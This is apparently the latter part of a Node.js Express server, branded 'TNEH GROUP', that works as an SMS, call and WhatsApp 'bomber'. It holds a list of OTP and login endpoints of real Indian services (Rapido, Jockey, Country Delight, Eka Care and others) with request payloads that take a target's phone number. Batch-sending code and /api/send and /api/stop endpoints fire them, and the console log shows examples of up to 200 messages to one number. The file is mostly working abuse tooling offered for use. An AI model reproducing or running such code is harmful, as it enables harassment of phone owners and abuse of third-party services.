        "type": "whatsapp"
    },
    {
        "name": "Jockey WhatsApp",
        "url": (phone) => `https://www.jockey.in/apps/jotp/api/login/resend-otp/+91${phone}?whatsapp=true`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "whatsapp"
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
        "type": "whatsapp"
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Client-Id": "androidp"},
        "data": (phone) => JSON.stringify({ payload: { allowWhatsapp: true, mobile: `+91${phone}` }, type: "mobile" }),
        "type": "whatsapp"
    },
    {
        "name": "KPN WhatsApp v3",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "Content-Type": "application/json"
        },
        "data": (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" }, notification_channel: "WHATSAPP" }),
        "type": "whatsapp"
    },
    {
        "name": "Rapido WhatsApp",
        "url": "https://app.rapido.bike/api/v3/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: `+91${phone}`, channel: "whatsapp" }),
        "type": "whatsapp"
    },
    {
        "name": "Country Delight WhatsApp",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user", channel: "whatsapp" }),
        "type": "whatsapp"
    }
];

// ============================================================
// COMBINE ALL APIS
// ============================================================
const ALL_APIS = API_LIST;

// ============================================================
// ACTIVE REQUEST TRACKING
// ============================================================
let activeRequests = {};
let requestCounter = 0;

// ============================================================
// HELPER FUNCTIONS
// ============================================================

function cleanPhone(phone) {
    if (!phone) return null;
    let cleaned = phone.replace(/[^0-9]/g, '');
    if (cleaned.startsWith('91') && cleaned.length > 10) {
        cleaned = cleaned.substring(2);
    }
    if (cleaned.length === 10) return cleaned;
    return null;
}

function formatUrl(url, phone) {
    if (typeof url === 'function') return url(phone);
    return url.replace(/{phone}/g, phone);
}

async function executeApi(api, phone, timeout = 10000) {
    const url = formatUrl(api.url, phone);
    const config = {
        method: api.method || 'GET',
        url: url,
        timeout: timeout,
        headers: api.headers || {},
        validateStatus: () => true
    };

    if (api.data && (api.method === 'POST' || api.method === 'PUT')) {
        const data = typeof api.data === 'function' ? api.data(phone) : api.data;
        if (data) {
            config.data = data;
            if (typeof data === 'object' && !config.headers['Content-Type']) {
                config.headers['Content-Type'] = 'application/json';
            }
        }
    }

    try {
        const response = await axios(config);
        return {
            success: response.status >= 200 && response.status < 300,
            api: api.name,
            status: response.status,
            type: api.type || 'unknown'
        };
    } catch (error) {
        return {
            success: false,
            api: api.name,
            error: error.code === 'ECONNABORTED' ? 'Timeout' : error.message || 'Request failed',
            type: api.type || 'unknown'
        };
    }
}

async function sendBatch(phone, count, type, stopFlag = null) {
    phone = cleanPhone(phone);
    if (!phone) {
        return { success: false, error: 'Invalid phone number. Use 10-digit Indian number.' };
    }

    let apis = ALL_APIS.filter(api => api.type === type);
    if (apis.length === 0) {
        return { success: false, error: `No ${type} APIs available.` };
    }

    // Shuffle for better distribution
    apis = apis.sort(() => Math.random() - 0.5);

    const maxCount = Math.min(count || apis.length, apis.length);
    const selectedApis = apis.slice(0, maxCount);

    const results = [];
    let successCount = 0;
    let failCount = 0;

    // Process in batches of 20 to avoid overwhelming
    const batchSize = 20;
    for (let i = 0; i < selectedApis.length; i += batchSize) {
        if (stopFlag && stopFlag.isStopped) {
            break;
        }

        const batch = selectedApis.slice(i, i + batchSize);
        const promises = batch.map(api => executeApi(api, phone));
        const batchResults = await Promise.all(promises);
        
        for (const result of batchResults) {
            if (result.success) successCount++;
            else failCount++;
            results.push(result);
        }
    }

    return {
        success: successCount > 0,
        total: selectedApis.length,
        success: successCount,
        failed: failCount,
        phone: phone,
        type: type,
        results: results,
        stopped: stopFlag?.isStopped || false
    };
}

// ============================================================
// API ENDPOINTS
// ============================================================

app.get('/api/send', async (req, res) => {
    try {
        const { num, count, type = 'sms' } = req.query;

        if (!num) {
            return res.status(400).json({ error: 'Phone number required. Use ?num=XXXXXXXXXX' });
        }

        const phone = cleanPhone(num);
        if (!phone) {
            return res.status(400).json({ error: 'Invalid phone number. Use 10-digit Indian number.' });
        }

        const countNum = parseInt(count) || 0;
        const totalAPIs = ALL_APIS.filter(api => api.type === type).length;
        const finalCount = countNum === 0 || countNum > totalAPIs ? totalAPIs : countNum;

        const requestId = ++requestCounter;
        const stopFlag = { isStopped: false };
        activeRequests[requestId] = { 
            id: requestId, 
            phone, 
            type, 
            count: finalCount,
            flag: stopFlag,
            timestamp: Date.now()
        };

        const result = await sendBatch(phone, finalCount, type, stopFlag);
        delete activeRequests[requestId];

        res.json({
            status: 'success',
            requestId,
            ...result
        });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: 'Internal server error', details: error.message });
    }
});

app.get('/api/stop', (req, res) => {
    let stoppedCount = 0;
    for (const [id, reqData] of Object.entries(activeRequests)) {
        if (reqData && reqData.flag) {
            reqData.flag.isStopped = true;
            stoppedCount++;
        }
    }
    res.json({
        status: 'stopped',
        message: `Stopped ${stoppedCount} active request(s)`,
        stoppedCount
    });
});

app.get('/api/list', (req, res) => {
    const { type } = req.query;
    let apis = ALL_APIS;
    if (type) {
        apis = apis.filter(api => api.type === type);
    }

    res.json({
        status: 'success',
        total: ALL_APIS.length,
        stats: {
            sms: ALL_APIS.filter(a => a.type === 'sms').length,
            call: ALL_APIS.filter(a => a.type === 'call').length,
            whatsapp: ALL_APIS.filter(a => a.type === 'whatsapp').length
        },
        apis: apis.map(api => ({
            name: api.name,
            type: api.type,
            method: api.method || 'GET'
        }))
    });
});

app.get('/api/stats', (req, res) => {
    const total = ALL_APIS.length;
    const sms = ALL_APIS.filter(a => a.type === 'sms').length;
    const call = ALL_APIS.filter(a => a.type === 'call').length;
    const wa = ALL_APIS.filter(a => a.type === 'whatsapp').length;

    res.json({
        status: 'success',
        server: {
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            nodeVersion: process.version
        },
        apis: {
            total,
            sms,
            call,
            whatsapp: wa
        },
        activeRequests: Object.keys(activeRequests).length
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        apisLoaded: ALL_APIS.length
    });
});

app.get('/api/status', (req, res) => {
    const requests = Object.entries(activeRequests).map(([id, data]) => ({
        id: parseInt(id),
        phone: data.phone,
        type: data.type,
        count: data.count,
        running: !data.flag?.isStopped,
        duration: Math.round((Date.now() - data.timestamp) / 1000) + 's'
    }));

    res.json({
        status: 'success',
        activeRequests: requests,
        totalActive: requests.length
    });
});

// ============================================================
// SERVE PUBLIC HTML
// ============================================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public.html'));
});

// ============================================================
// START SERVER
// ============================================================
const totalAPIs = ALL_APIS.length;
const smsCount = ALL_APIS.filter(a => a.type === 'sms').length;
const callCount = ALL_APIS.filter(a => a.type === 'call').length;
const waCount = ALL_APIS.filter(a => a.type === 'whatsapp').length;

app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`    TNEH GROUP API SERVER`);
    console.log(`========================================`);
    console.log(`📍 Server running on port: ${PORT}`);
    console.log(`🌐 Base URL: http://localhost:${PORT}`);
    console.log(`========================================`);
    console.log(`📊 Total APIs loaded: ${totalAPIs}`);
    console.log(`   📱 SMS APIs: ${smsCount}`);
    console.log(`   📞 Call APIs: ${callCount}`);
    console.log(`   💬 WhatsApp APIs: ${waCount}`);
    console.log(`========================================`);
    console.log(`📌 Usage Examples:`);
    console.log(`   GET /api/send?num=9876543210&count=200&type=sms`);
    console.log(`   GET /api/send?num=9876543210&count=50&type=call`);
    console.log(`   GET /api/send?num=9876543210&count=20&type=whatsapp`);
    console.log(`   GET /api/stop`);
    console.log(`========================================`);
});

module.exports = app;
